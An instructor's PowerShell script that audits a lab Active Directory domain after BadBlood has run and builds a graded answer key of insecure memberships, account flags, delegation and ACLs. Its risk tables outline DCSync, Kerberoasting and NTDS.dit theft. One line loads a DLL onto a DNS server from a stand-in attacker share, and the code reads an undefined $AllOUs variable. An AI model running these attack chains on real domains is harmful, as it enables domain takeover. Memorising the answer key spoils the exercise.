#Requires -Modules ActiveDirectory
<#
.SYNOPSIS
    BadBlood Domain Cleanup Answer Key Generator (v2 - Annotated)
.DESCRIPTION
    Audits an Active Directory domain after BadBlood has been run and generates
    a comprehensive answer key showing:
      - Every violation found (what's wrong)
      - WHY it's a problem (attack scenario / security principle)
      - The user's OU/department context
      - The expected clean state (what students should fix it to)
      - Severity ratings for grading
    
    Designed for instructors running BadBlood (github.com/davidprowe/BadBlood)
    in a lab environment.

.NOTES
    Run this on a Domain Controller or a machine with RSAT installed.
    Must be run as a Domain Admin or equivalent.

.EXAMPLE
    .\Generate-BadBloodAnswerKey.ps1
    .\Generate-BadBloodAnswerKey.ps1 -OutputPath "C:\AnswerKeys" -IncludeGPOAnalysis
#>

[CmdletBinding()]
param(
    [string]$OutputPath = ".\BadBlood_AnswerKey_$(Get-Date -Format 'yyyyMMdd_HHmmss')",
    [switch]$IncludeGPOAnalysis,
    [switch]$ExportCSVs,
    [switch]$Quiet
)

# ============================================================================
# CONFIGURATION: Define what "clean" looks like
# ============================================================================
# These are the privileged groups that normal users should NOT be in.
# BadBlood deliberately puts random users into these groups.

$PrivilegedGroups = @(
    "Domain Admins"
    "Enterprise Admins"
    "Schema Admins"
    "Administrators"
    "Account Operators"
    "Backup Operators"
    "Server Operators"
    "Print Operators"
    "DnsAdmins"
    "Group Policy Creator Owners"
)

# Tier 0 groups - these should ONLY contain Tier 0 accounts
$Tier0Groups = @(
    "Domain Admins"
    "Enterprise Admins"
    "Schema Admins"
    "Administrators"
)

# Accounts that are EXPECTED to be in privileged groups (built-in/legitimate)
$LegitimatePrivilegedAccounts = @(
    "Administrator"
    "krbtgt"
)

# OUs where admin/service accounts should live (Tier model)
$AdminOUPatterns = @(
    "*Admin*"
    "*Tier 0*"
    "*Tier 1*"
    "*Tier 2*"
    "*T0-*"
    "*T1-*"
    "*T2-*"
)

# Description patterns that identify BadBlood-created objects
$BadBloodDescPatterns = @(
    "*secframe.com/badblood*"
    "*Badblood github.com*"
    "*davidprowe/badblood*"
    "*Created with secframe*"
    "*User Group Created by Badblood*"
)

# ============================================================================
# SECURITY KNOWLEDGE BASE - Why each group/setting is dangerous
# ============================================================================

$GroupRiskExplanations = @{
    "Domain Admins" = @{ Risk="FULL DOMAIN COMPROMISE"; Why="Unrestricted access to every domain object. Can DCSync, deploy ransomware via GPO, create Golden Tickets."; Attack="Phish user -> Mimikatz -> DCSync -> Golden Ticket = permanent access."; Principle="DA accounts must be separate, dedicated, used only on Tier 0 systems." }
    "Enterprise Admins" = @{ Risk="FULL FOREST COMPROMISE"; Why="Admin rights across the ENTIRE AD forest. More powerful than DA in multi-domain environments."; Attack="Same as DA, but blast radius extends to every domain in the forest."; Principle="EA should be EMPTY. Add members temporarily for cross-domain tasks only." }
    "Schema Admins" = @{ Risk="IRREVERSIBLE FOREST CHANGES"; Why="Can modify the AD schema - changes are forest-wide and CANNOT be rolled back."; Attack="Attacker corrupts schema -> breaks replication across all DCs."; Principle="Should ALWAYS be empty. Add temporarily only during planned schema extensions." }
    "Administrators" = @{ Risk="LOCAL+DOMAIN ADMIN ON DCs"; Why="Full control over DCs. Can access NTDS.dit (all password hashes) and modify any security settings."; Attack="Log into DC -> dump NTDS.dit -> every password hash in the domain."; Principle="Only DA/EA groups and built-in Administrator account." }
    "Account Operators" = @{ Risk="CAN CREATE/MODIFY ACCOUNTS"; Why="Can create, modify, delete most users/groups. Can reset non-admin passwords and escalate via nested groups. LEGACY group from NT4."; Attack="Reset non-admin passwords -> take over accounts -> create strategic group memberships -> escalate."; Principle="LEGACY group. Should be EMPTY. Use delegated ACLs on OUs instead." }
    "Backup Operators" = @{ Risk="CAN EXTRACT NTDS.DIT"; Why="Can bypass all file permissions to back up NTDS.dit (every password hash) and SYSTEM hive. Effectively equivalent to Domain Admin for credential theft."; Attack="wbadmin to copy NTDS.dit + SYSTEM hive -> secretsdump.py offline -> every domain password."; Principle="Effectively DA-equivalent for credential theft. Should be EMPTY." }
    "Server Operators" = @{ Risk="CAN LOG INTO DCs + MODIFY SERVICES"; Why="Can log into DCs interactively and modify service binary paths to execute arbitrary code as SYSTEM."; Attack="Modify DC service binary path to malicious exe -> service restarts as SYSTEM -> DA equivalent."; Principle="LEGACY group. Should be EMPTY." }
    "Print Operators" = @{ Risk="CAN LOG INTO DCs + LOAD DRIVERS"; Why="Can log into DCs AND load kernel drivers. A malicious driver = SYSTEM access. Despite harmless name, this is a critical escalation path (PrintNightmare)."; Attack="Load malicious printer driver on DC -> runs in kernel mode -> SYSTEM on DC = full domain compromise."; Principle="Should be EMPTY. Never manage printers from DCs." }
    "DnsAdmins" = @{ Risk="REMOTE CODE EXECUTION ON DCs"; Why="Can configure DNS service on DCs to load a custom DLL. DNS runs as SYSTEM, so malicious DLL = SYSTEM on every DC."; Attack="dnscmd /config /serverlevelplugindll \\attacker\mal.dll -> restart DNS -> SYSTEM on DC."; Principle="Effectively DA via DLL injection. Should be EMPTY or dedicated DNS admin only." }
    "Group Policy Creator Owners" = @{ Risk="CAN CREATE GPOs = RCE"; Why="Can create GPOs. A malicious GPO linked to any OU deploys malware/scripts as SYSTEM on all targeted machines within 90 min."; Attack="Create GPO with malicious startup script -> link to server OU -> all machines execute attacker code."; Principle="GPO creation restricted to dedicated admin accounts only." }
}

$SettingRiskExplanations = @{
    "PasswordNotRequired" = @{ Why="PASSWD_NOTREQD flag allows blank password. Anyone can log in with zero effort."; Attack="Enumerate PASSWD_NOTREQD accounts -> blank password login -> instant access."; Principle="Every account must require a password." }
    "PasswordNeverExpires" = @{ Why="If compromised, the password remains valid forever. Attacker has permanent access."; Attack="Obtain hash from breach -> password never expires -> permanent access until manually discovered."; Principle="Passwords should rotate per policy. Service accounts should use gMSAs." }
    "DoesNotRequirePreAuth" = @{ Why="ANYONE on the network (no creds needed!) can request an encrypted ticket and crack it offline at billions of attempts/sec with Hashcat."; Attack="Rubeus/GetNPUsers.py (no creds needed) -> encrypted ticket -> Hashcat offline -> plaintext password."; Principle="Kerberos pre-auth should ALWAYS be required." }
    "TrustedForDelegation" = @{ Why="Caches full TGT of any authenticating user. If a DA connects, their TGT is cached and extractable."; Attack="Compromise account -> Rubeus monitors TGTs -> coerce DA auth via printer bug -> capture DA TGT -> impersonate DA."; Principle="Only DCs should have unconstrained delegation." }
    "TrustedToAuthForDelegation" = @{ Why="Can request service tickets as ANY user (S4U2Self). Can impersonate Domain Admins to delegation targets."; Attack="S4U2Self as DA -> S4U2Proxy to target service -> authenticated as DA."; Principle="Use Resource-Based Constrained Delegation instead." }
    "AllowReversiblePasswordEncryption" = @{ Why="Password stored in recoverable form (essentially plaintext). Anyone with NTDS.dit can recover the actual password."; Attack="Obtain NTDS.dit -> decrypt -> PLAINTEXT password (not hash)."; Principle="Never enable. Exists only for legacy CHAP/DIGEST." }
    "SIDHistory" = @{ Why="Can contain privileged SIDs granting invisible access. Standard group queries won't show it - stealth backdoor."; Attack="Inject DA SID into user's SID History -> silent DA rights -> invisible to Get-ADGroupMember."; Principle="Should be empty unless actively migrating domains." }
    "Kerberoastable" = @{ Why="Any domain user can request a service ticket encrypted with this account's password hash. Offline cracking at billions/sec."; Attack="Any domain user -> GetUserSPNs.py -> ticket -> Hashcat -> plaintext password."; Principle="User accounts should NOT have SPNs. Use gMSAs instead." }
    "AdminCountOrphan" = @{ Why="SDProp set AdminCount=1 and removed ACL inheritance when in a priv group. After removal, AdminCount stays and inheritance stays broken. Delegated permissions don't apply."; Attack="Not directly exploitable but creates blind spots: helpdesk can't reset password, inherited policies don't apply."; Principle="After removing from priv group: clear AdminCount AND re-enable ACL inheritance." }
}

$ACLRiskExplanations = @{
    "GenericAll"    = "FULL CONTROL - read/write all properties, reset passwords, modify group membership, delete."
    "GenericWrite"  = "WRITE ALL PROPERTIES - can modify SPNs (Kerberoasting), script paths (code exec), group memberships."
    "WriteDacl"     = "MODIFY PERMISSIONS - can grant themselves any permission, effectively = GenericAll."
    "WriteOwner"    = "CHANGE OWNERSHIP - take ownership -> modify DACL -> grant full control."
    "WriteProperty" = "WRITE PROPERTIES - could modify script paths, SPNs, group membership."
    "ExtendedRight" = "SPECIAL OPS - includes Reset Password, DCSync (Replicating Directory Changes), Unexpire Password."
}

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

function Write-Status {
    param([string]$Message, [string]$Color = "Cyan")
    if (-not $Quiet) {
        Write-Host "[*] $Message" -ForegroundColor $Color
    }
}

function Get-UserDepartment {
    param([string]$CanonicalName)
    if ($CanonicalName -match '/People/([^/]+)/') { return $Matches[1] }
    elseif ($CanonicalName -match '/Stage/([^/]+)/') { return "Stage/$($Matches[1])" }
    elseif ($CanonicalName -match '/Admin/') { return "Admin" }
    return "Unknown"
}

function Get-FriendlyOUPath {
    param([string]$CanonicalName)
    if ($CanonicalName) {
        $parts = $CanonicalName -split '/'
        if ($parts.Count -ge 3) { return ($parts[1..($parts.Count - 2)] -join ' > ') }
    }
    return "Root"
}

function Write-Finding {
    param(
        [string]$Category,
        [string]$Severity,
        [string]$Finding,
        [string]$CurrentState,
        [string]$ExpectedState,
        [string]$WhyBad = "",
        [string]$AttackScenario = "",
        [string]$UserContext = "",
        [string]$Principle = "",
        [string]$ObjectDN = ""
    )
    [PSCustomObject]@{
        Category       = $Category
        Severity       = $Severity
        Finding        = $Finding
        CurrentState   = $CurrentState
        ExpectedState  = $ExpectedState
        WhyBad         = $WhyBad
        AttackScenario = $AttackScenario
        UserContext     = $UserContext
        Principle       = $Principle
        ObjectDN       = $ObjectDN
    }
}

# ============================================================================
# SETUP
# ============================================================================

Write-Host @"
===============================================================================
   BadBlood Domain Cleanup - Answer Key Generator
   $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
===============================================================================
"@ -ForegroundColor Yellow

# Create output directory
if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
}

$DomainInfo = Get-ADDomain
$ForestInfo = Get-ADForest
$DomainDN   = $DomainInfo.DistinguishedName
$DomainName = $DomainInfo.DNSRoot

Write-Status "Auditing domain: $DomainName"
Write-Status "Domain DN: $DomainDN"
Write-Status "Output directory: $OutputPath"

$AllFindings = [System.Collections.Generic.List[PSObject]]::new()

# ============================================================================
# SECTION 1: IDENTIFY ALL BADBLOOD-CREATED OBJECTS
# ============================================================================
Write-Status "SECTION 1: Identifying all BadBlood-created objects..."

# Find all users created by BadBlood
$AllUsers = Get-ADUser -Filter * -Properties Description, MemberOf, Enabled, `
    PasswordNeverExpires, PasswordNotRequired, DoesNotRequirePreAuth, `
    TrustedForDelegation, TrustedToAuthForDelegation, AdminCount, `
    SIDHistory, ServicePrincipalName, CanonicalName, WhenCreated, `
    AllowReversiblePasswordEncryption, AccountNotDelegated

$BadBloodUsers = $AllUsers | Where-Object {
    $desc = $_.Description
    ($BadBloodDescPatterns | ForEach-Object { $desc -like $_ }) -contains $true
}

# Find all groups created by BadBlood
$AllGroups = Get-ADGroup -Filter * -Properties Description, Members, MemberOf, CanonicalName, WhenCreated

$BadBloodGroups = $AllGroups | Where-Object {
    $desc = $_.Description
    ($BadBloodDescPatterns | ForEach-Object { $desc -like $_ }) -contains $true
}

Write-Status "Found $($BadBloodUsers.Count) BadBlood-created users" "Green"
Write-Status "Found $($BadBloodGroups.Count) BadBlood-created security groups" "Green"

# Build lookup: SamAccountName -> context info
$UserContextMap = @{}
foreach ($u in $AllUsers) {
    $UserContextMap[$u.SamAccountName] = @{
        CanonicalName = $u.CanonicalName
        Department    = Get-UserDepartment -CanonicalName $u.CanonicalName
        FriendlyOU    = Get-FriendlyOUPath -CanonicalName $u.CanonicalName
    }
}

# ============================================================================
# SECTION 2: PRIVILEGED GROUP MEMBERSHIP VIOLATIONS
# ============================================================================
Write-Status "SECTION 2: Auditing privileged group memberships..."

$PrivGroupReport = [System.Collections.Generic.List[PSObject]]::new()

foreach ($groupName in $PrivilegedGroups) {
    try {
        $group = Get-ADGroup $groupName -Properties Members
        $members = Get-ADGroupMember $groupName -Recursive -ErrorAction SilentlyContinue
        
        foreach ($member in $members) {
            $isLegitimate = $LegitimatePrivilegedAccounts -contains $member.SamAccountName
            $isBadBlood = $false
            
            if ($member.objectClass -eq "user") {
                $userObj = $AllUsers | Where-Object { $_.SamAccountName -eq $member.SamAccountName }
                if ($userObj) {
                    $desc = $userObj.Description
                    $isBadBlood = ($BadBloodDescPatterns | ForEach-Object { $desc -like $_ }) -contains $true
                }
            }
            
            $ctx = $UserContextMap[$member.SamAccountName]
            $dept = if ($ctx) { $ctx.Department } else { "Unknown" }
            $ouPath = if ($ctx) { $ctx.FriendlyOU } else { "Unknown" }
            
            $privEntry = [PSCustomObject]@{
                PrivilegedGroup   = $groupName
                MemberName        = $member.SamAccountName
                MemberType        = $member.objectClass
                MemberDN          = $member.distinguishedName
                Department        = $dept
                OUPath            = $ouPath
                IsLegitimate      = $isLegitimate
                IsBadBloodCreated = $isBadBlood
                Action            = if ($isLegitimate) { "KEEP" } else { "REMOVE" }
            }
            $PrivGroupReport.Add($privEntry)
            
            if (-not $isLegitimate) {
                $sev = if ($groupName -in $Tier0Groups) { "CRITICAL" } else { "HIGH" }
                $gi = $GroupRiskExplanations[$groupName]
                
                $contextNote = "User is in '$ouPath' (Dept: $dept). "
                if ($dept -ne "Admin" -and $dept -notlike "*Tier*") {
                    $contextNote += "As a regular departmental user, they have NO business reason to be in '$groupName'."
                } else {
                    $contextNote += "Even in an admin OU, they should use a DEDICATED admin account."
                }
                
                $finding = Write-Finding -Category "Privileged Group Membership" `
                    -Severity $sev `
                    -Finding "User '$($member.SamAccountName)' (Dept: $dept, OU: $ouPath) is a member of '$groupName'" `
                    -CurrentState "Member of $groupName | Risk: $(if($gi){$gi.Risk}else{'ELEVATED'})" `
                    -ExpectedState "REMOVE from $groupName" `
                    -WhyBad $(if($gi){$gi.Why}else{"Elevated privileges regular users should not have."}) `
                    -AttackScenario $(if($gi){$gi.Attack}else{"Compromising this user inherits all $groupName privileges."}) `
                    -UserContext $contextNote `
                    -Principle $(if($gi){$gi.Principle}else{"Least Privilege."}) `
                    -ObjectDN $member.distinguishedName
                $AllFindings.Add($finding)
            }
        }
    }
    catch {
        Write-Warning "Could not query group: $groupName - $_"
    }
}

$ViolationCount = ($PrivGroupReport | Where-Object { $_.Action -eq "REMOVE" }).Count
Write-Status "Found $ViolationCount privileged group membership violations" "Red"

# ============================================================================
# SECTION 3: DANGEROUS USER ACCOUNT SETTINGS
# ============================================================================
Write-Status "SECTION 3: Checking for dangerous user account settings..."

foreach ($user in $BadBloodUsers) {
    # Password Never Expires
    if ($user.PasswordNeverExpires) {
        $AllFindings.Add((Write-Finding -Category "Account Settings" `
            -Severity "MEDIUM" `
            -Finding "User '$($user.SamAccountName)' has PasswordNeverExpires set" `
            -CurrentState "PasswordNeverExpires = True" `
            -ExpectedState "PasswordNeverExpires = False" `
            -ObjectDN $user.DistinguishedName))
    }
    
    # Password Not Required
    if ($user.PasswordNotRequired) {
        $AllFindings.Add((Write-Finding -Category "Account Settings" `
            -Severity "CRITICAL" `
            -Finding "User '$($user.SamAccountName)' does not require a password" `
            -CurrentState "PasswordNotRequired = True" `
            -ExpectedState "PasswordNotRequired = False" `
            -ObjectDN $user.DistinguishedName))
    }
    
    # Kerberos Pre-Auth Not Required (AS-REP Roastable)
    if ($user.DoesNotRequirePreAuth) {
        $AllFindings.Add((Write-Finding -Category "Kerberos Security" `
            -Severity "HIGH" `
            -Finding "User '$($user.SamAccountName)' does not require Kerberos pre-auth (AS-REP Roastable)" `
            -CurrentState "DoesNotRequirePreAuth = True" `
            -ExpectedState "DoesNotRequirePreAuth = False" `
            -ObjectDN $user.DistinguishedName))
    }
    
    # Unconstrained Delegation
    if ($user.TrustedForDelegation) {
        $AllFindings.Add((Write-Finding -Category "Delegation" `
            -Severity "CRITICAL" `
            -Finding "User '$($user.SamAccountName)' is trusted for unconstrained delegation" `
            -CurrentState "TrustedForDelegation = True" `
            -ExpectedState "TrustedForDelegation = False" `
            -ObjectDN $user.DistinguishedName))
    }
    
    # Constrained Delegation (Protocol Transition)
    if ($user.TrustedToAuthForDelegation) {
        $AllFindings.Add((Write-Finding -Category "Delegation" `
            -Severity "HIGH" `
            -Finding "User '$($user.SamAccountName)' is trusted to auth for delegation (protocol transition)" `
            -CurrentState "TrustedToAuthForDelegation = True" `
            -ExpectedState "TrustedToAuthForDelegation = False (or validate if needed)" `
            -ObjectDN $user.DistinguishedName))
    }
    
    # Reversible Encryption
    if ($user.AllowReversiblePasswordEncryption) {
        $AllFindings.Add((Write-Finding -Category "Account Settings" `
            -Severity "HIGH" `
            -Finding "User '$($user.SamAccountName)' allows reversible password encryption" `
            -CurrentState "AllowReversiblePasswordEncryption = True" `
            -ExpectedState "AllowReversiblePasswordEncryption = False" `
            -ObjectDN $user.DistinguishedName))
    }
    
    # SID History (possible privilege escalation)
    if ($user.SIDHistory.Count -gt 0) {
        $AllFindings.Add((Write-Finding -Category "SID History" `
            -Severity "HIGH" `
            -Finding "User '$($user.SamAccountName)' has SID History entries" `
            -CurrentState "SIDHistory contains $($user.SIDHistory.Count) entries" `
            -ExpectedState "SIDHistory should be empty (clear all entries)" `
            -ObjectDN $user.DistinguishedName))
    }
    
    # SPNs on user accounts (Kerberoastable)
    if ($user.ServicePrincipalName.Count -gt 0) {
        $AllFindings.Add((Write-Finding -Category "Kerberos Security" `
            -Severity "HIGH" `
            -Finding "User '$($user.SamAccountName)' has SPNs set (Kerberoastable)" `
            -CurrentState "SPNs: $($user.ServicePrincipalName -join ', ')" `
            -ExpectedState "Remove SPNs or convert to managed service account" `
            -ObjectDN $user.DistinguishedName))
    }
    
    # AdminCount = 1 but not in admin groups (stale AdminCount / SDProp orphan)
    if ($user.AdminCount -eq 1) {
        $inPrivGroup = $false
        foreach ($grp in $PrivilegedGroups) {
            try {
                $m = Get-ADGroupMember $grp -Recursive -ErrorAction SilentlyContinue |
                     Where-Object { $_.SamAccountName -eq $user.SamAccountName }
                if ($m) { $inPrivGroup = $true; break }
            } catch {}
        }
        if (-not $inPrivGroup) {
            $AllFindings.Add((Write-Finding -Category "Account Settings" `
                -Severity "MEDIUM" `
                -Finding "User '$($user.SamAccountName)' has AdminCount=1 but is not in any privileged group (stale)" `
                -CurrentState "AdminCount = 1 (orphaned)" `
                -ExpectedState "AdminCount = 0, reset ACL inheritance" `
                -ObjectDN $user.DistinguishedName))
        }
    }
}

# ============================================================================
# SECTION 4: NESTED GROUP MEMBERSHIP CHAINS
# ============================================================================
Write-Status "SECTION 4: Analyzing nested group membership chains..."

foreach ($groupName in $PrivilegedGroups) {
    try {
        $directMembers = Get-ADGroupMember $groupName -ErrorAction SilentlyContinue
        $nestedGroups = $directMembers | Where-Object { $_.objectClass -eq "group" }
        
        foreach ($nestedGroup in $nestedGroups) {
            $ngDesc = (Get-ADGroup $nestedGroup.SamAccountName -Properties Description).Description
            $isBB = ($BadBloodDescPatterns | ForEach-Object { $ngDesc -like $_ }) -contains $true
            
            $AllFindings.Add((Write-Finding -Category "Nested Group Membership" `
                -Severity "HIGH" `
                -Finding "Group '$($nestedGroup.SamAccountName)' is nested inside '$groupName'" `
                -CurrentState "Nested member of $groupName (BadBlood: $isBB)" `
                -ExpectedState "REMOVE group nesting - evaluate each member individually" `
                -ObjectDN $nestedGroup.distinguishedName))
        }
    }
    catch {}
}

# ============================================================================
# SECTION 5: OU STRUCTURE ANALYSIS (OPTIMIZED)
# ============================================================================
Write-Status "SECTION 5: Analyzing OU structure..."

# PRE-CALCULATE: Get all privileged members ONCE and store in a HashSet for instant lookup
$PrivilegedMemberSIDs = New-Object 'System.Collections.Generic.HashSet[string]'
foreach ($grpName in $PrivilegedGroups) {
    try {
        # Get recursive members and add their SIDs to our lookup table
        Get-ADGroupMember -Identity $grpName -Recursive -ErrorAction SilentlyContinue | 
            ForEach-Object { [void]$PrivilegedMemberSIDs.Add($_.SID.Value) }
    } catch {}
}

# Map users to their OUs and check for misplacements
foreach ($user in $BadBloodUsers) {
    $userOU = ($user.DistinguishedName -replace "^CN=[^,]+,", "")
    $canonPath = $user.CanonicalName
    
    # Check if user is in an Admin/Tier OU pattern
    $isInAdminOU = $false
    foreach ($pattern in $AdminOUPatterns) {
        if ($userOU -like $pattern) { $isInAdminOU = $true; break }
    }
    
    # INSTANT LOOKUP: Instead of a new AD query, check our pre-built HashSet
    $isInPrivGroup = $PrivilegedMemberSIDs.Contains($user.SID.Value)
    
    # User in People OU but has admin privs -> violation
    if ($canonPath -like "*People*" -and $isInPrivGroup) {
        $AllFindings.Add((Write-Finding -Category "OU Misplacement" `
            -Severity "HIGH" `
            -Finding "User '$($user.SamAccountName)' is in People OU but has privileged group membership" `
            -CurrentState "Located in: $canonPath | Has privileged access" `
            -ExpectedState "Either remove from privileged groups OR move to appropriate Admin/Tier OU" `
            -ObjectDN $user.DistinguishedName))
    }
    
    # User in Admin/Tier OU but is a regular BadBlood user
    if ($isInAdminOU -and -not $isInPrivGroup) {
        $AllFindings.Add((Write-Finding -Category "OU Misplacement" `
            -Severity "MEDIUM" `
            -Finding "User '$($user.SamAccountName)' is in Admin/Tier OU but has no privileged memberships" `
            -CurrentState "Located in: $canonPath | No privileged access" `
            -ExpectedState "Move to appropriate People/Department OU or grant appropriate Tier access" `
            -ObjectDN $user.DistinguishedName))
    }
}

# ============================================================================
# SECTION 6: ACL / DELEGATION ANALYSIS
# ============================================================================
Write-Status "SECTION 6: Analyzing ACL delegations on OUs and objects..."

# Check for dangerous ACLs BadBlood sets on key objects
$CriticalObjects = @(
    $DomainDN
    "CN=AdminSDHolder,CN=System,$DomainDN"
)

# Add all OU DNs
$CriticalObjects += ($AllOUs | ForEach-Object { $_.DistinguishedName })

$ACLFindings = [System.Collections.Generic.List[PSObject]]::new()
$DangerousRights = @(
    "GenericAll"
    "GenericWrite"
    "WriteDacl"
    "WriteOwner"
    "WriteProperty"
    "ExtendedRight"
    "Self"
)

$checkedCount = 0
$totalToCheck = [Math]::Min($CriticalObjects.Count, 100) # Cap to avoid timeout
Write-Status "Checking ACLs on $totalToCheck critical objects (of $($CriticalObjects.Count) total)..."

foreach ($objDN in ($CriticalObjects | Select-Object -First $totalToCheck)) {
    $checkedCount++
    if ($checkedCount % 25 -eq 0) {
        Write-Status "  ACL check progress: $checkedCount / $totalToCheck"
    }
    
    try {
        $acl = Get-Acl -Path "AD:\$objDN" -ErrorAction SilentlyContinue
        if (-not $acl) { continue }
        
        foreach ($ace in $acl.Access) {
            $identity = $ace.IdentityReference.ToString()
            
            # Skip built-in/expected identities
            if ($identity -match "^(NT AUTHORITY|BUILTIN|S-1-5)" -or
                $identity -match "(Domain Admins|Enterprise Admins|SYSTEM|Administrators)$") {
                continue
            }
            
            # Check if this is a BadBlood user or group with dangerous permissions
            $samName = $identity -replace "^.*\\"
            $isBBUser = $BadBloodUsers | Where-Object { $_.SamAccountName -eq $samName }
            $isBBGroup = $BadBloodGroups | Where-Object { $_.SamAccountName -eq $samName }
            
            if (($isBBUser -or $isBBGroup) -and
                ($DangerousRights -contains $ace.ActiveDirectoryRights.ToString() -or
                 ($ace.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::GenericAll) -or
                 ($ace.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl) -or
                 ($ace.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner) -or
                 ($ace.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::GenericWrite)))
            {
                $sev = if ($objDN -like "*AdminSDHolder*" -or $objDN -eq $DomainDN) { "CRITICAL" } else { "HIGH" }
                $objType = if ($isBBUser) { "User" } else { "Group" }
                
                $AllFindings.Add((Write-Finding -Category "Dangerous ACL" `
                    -Severity $sev `
                    -Finding "$objType '$samName' has '$($ace.ActiveDirectoryRights)' on '$objDN'" `
                    -CurrentState "ACE: $($ace.AccessControlType) | Rights: $($ace.ActiveDirectoryRights) | Inherited: $($ace.IsInherited)" `
                    -ExpectedState "REMOVE this ACE - BadBlood-created $objType should not have these permissions" `
                    -ObjectDN $objDN))
            }
        }
    }
    catch {
        # Silently skip objects we can't read ACLs on
    }
}

# ============================================================================
# SECTION 7: GPO ANALYSIS (Optional)
# ============================================================================
if ($IncludeGPOAnalysis) {
    Write-Status "SECTION 7: Analyzing Group Policy Objects..."
    
    try {
        Import-Module GroupPolicy -ErrorAction Stop
        $AllGPOs = Get-GPO -All
        
        foreach ($gpo in $AllGPOs) {
            # Check GPO permissions for BadBlood objects
            $gpoPerms = Get-GPPermission -Guid $gpo.Id -All -ErrorAction SilentlyContinue
            
            foreach ($perm in $gpoPerms) {
                $trustee = $perm.Trustee.Name
                $isBB = ($BadBloodUsers | Where-Object { $_.SamAccountName -eq $trustee }) -or
                         ($BadBloodGroups | Where-Object { $_.SamAccountName -eq $trustee })
                
                if ($isBB -and $perm.Permission -in @("GpoEdit", "GpoEditDeleteModifySecurity")) {
                    $AllFindings.Add((Write-Finding -Category "GPO Permissions" `
                        -Severity "HIGH" `
                        -Finding "BadBlood object '$trustee' can edit GPO '$($gpo.DisplayName)'" `
                        -CurrentState "Permission: $($perm.Permission) on GPO" `
                        -ExpectedState "REMOVE edit permissions for this object" `
                        -ObjectDN "GPO: $($gpo.Id)"))
                }
            }
        }
    }
    catch {
        Write-Warning "GroupPolicy module not available. Skipping GPO analysis."
    }
}

# ============================================================================
# SECTION 8: COMPUTER OBJECT ANALYSIS
# ============================================================================
Write-Status "SECTION 8: Analyzing computer objects..."

$Computers = Get-ADComputer -Filter * -Properties Description, MemberOf, TrustedForDelegation, CanonicalName

foreach ($comp in $Computers) {
    if ($comp.TrustedForDelegation -and $comp.Name -notlike "*DC*") {
        $AllFindings.Add((Write-Finding -Category "Delegation" `
            -Severity "HIGH" `
            -Finding "Computer '$($comp.Name)' has unconstrained delegation enabled" `
            -CurrentState "TrustedForDelegation = True" `
            -ExpectedState "TrustedForDelegation = False (unless this is a DC)" `
            -ObjectDN $comp.DistinguishedName))
    }
}

# ============================================================================
# GENERATE REPORTS
# ============================================================================
Write-Status "Generating reports..."

# --- MASTER ANSWER KEY (TXT) ---
$reportLines = [System.Collections.Generic.List[string]]::new()

$reportLines.Add("=" * 80)
$reportLines.Add("  BADBLOOD DOMAIN CLEANUP - MASTER ANSWER KEY")
$reportLines.Add("  Domain: $DomainName")
$reportLines.Add("  Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
$reportLines.Add("  Total Findings: $($AllFindings.Count)")
$reportLines.Add("=" * 80)
$reportLines.Add("")

# Summary counts
$critical = ($AllFindings | Where-Object { $_.Severity -eq "CRITICAL" }).Count
$high     = ($AllFindings | Where-Object { $_.Severity -eq "HIGH" }).Count
$medium   = ($AllFindings | Where-Object { $_.Severity -eq "MEDIUM" }).Count
$low      = ($AllFindings | Where-Object { $_.Severity -eq "LOW" }).Count
$info     = ($AllFindings | Where-Object { $_.Severity -eq "INFO" }).Count

$reportLines.Add("SEVERITY SUMMARY")
$reportLines.Add("-" * 40)
$reportLines.Add("  CRITICAL : $critical")
$reportLines.Add("  HIGH     : $high")
$reportLines.Add("  MEDIUM   : $medium")
$reportLines.Add("  LOW      : $low")
$reportLines.Add("  INFO     : $info")
$reportLines.Add("")

$reportLines.Add("CATEGORY SUMMARY")
$reportLines.Add("-" * 40)
$categories = $AllFindings | Group-Object Category | Sort-Object Count -Descending
foreach ($cat in $categories) {
    $reportLines.Add("  $($cat.Name): $($cat.Count) findings")
}
$reportLines.Add("")

# BadBlood Object Inventory
$reportLines.Add("=" * 80)
$reportLines.Add("  BADBLOOD OBJECT INVENTORY")
$reportLines.Add("=" * 80)
$reportLines.Add("")
$reportLines.Add("USERS CREATED BY BADBLOOD ($($BadBloodUsers.Count) total):")
$reportLines.Add("-" * 60)
foreach ($u in ($BadBloodUsers | Sort-Object SamAccountName)) {
    $ou = ($u.DistinguishedName -replace "^CN=[^,]+,", "") -replace ",$DomainDN$", ""
    $reportLines.Add("  $($u.SamAccountName.PadRight(25)) | OU: $ou")
}
$reportLines.Add("")

$reportLines.Add("GROUPS CREATED BY BADBLOOD ($($BadBloodGroups.Count) total):")
$reportLines.Add("-" * 60)
foreach ($g in ($BadBloodGroups | Sort-Object SamAccountName)) {
    $memberCount = ($g.Members | Measure-Object).Count
    $reportLines.Add("  $($g.SamAccountName.PadRight(35)) | Members: $memberCount")
}
$reportLines.Add("")

# Detailed Findings by Category
$reportLines.Add("=" * 80)
$reportLines.Add("  DETAILED FINDINGS (ANSWER KEY)")
$reportLines.Add("=" * 80)

foreach ($cat in $categories) {
    $reportLines.Add("")
    $reportLines.Add("=" * 80)
    $reportLines.Add("CATEGORY: $($cat.Name) ($($cat.Count) findings)")
    $reportLines.Add("=" * 80)
    
    $findingNum = 0
    foreach ($f in ($cat.Group | Sort-Object Severity)) {
        $findingNum++
        $reportLines.Add("")
        $reportLines.Add("  [$($f.Severity)] Finding #$findingNum")
        $reportLines.Add("  WHAT:      $($f.Finding)")
        $reportLines.Add("  CURRENT:   $($f.CurrentState)")
        $reportLines.Add("  FIX:       $($f.ExpectedState)")
        if ($f.WhyBad) {
            $reportLines.Add("  WHY BAD:   $($f.WhyBad)")
        }
        if ($f.AttackScenario) {
            $reportLines.Add("  ATTACK:    $($f.AttackScenario)")
        }
        if ($f.UserContext) {
            $reportLines.Add("  CONTEXT:   $($f.UserContext)")
        }
        if ($f.Principle) {
            $reportLines.Add("  PRINCIPLE: $($f.Principle)")
        }
        if ($f.ObjectDN) {
            $reportLines.Add("  OBJECT:    $($f.ObjectDN)")
        }
        $reportLines.Add("  " + "-" * 70)
    }
}

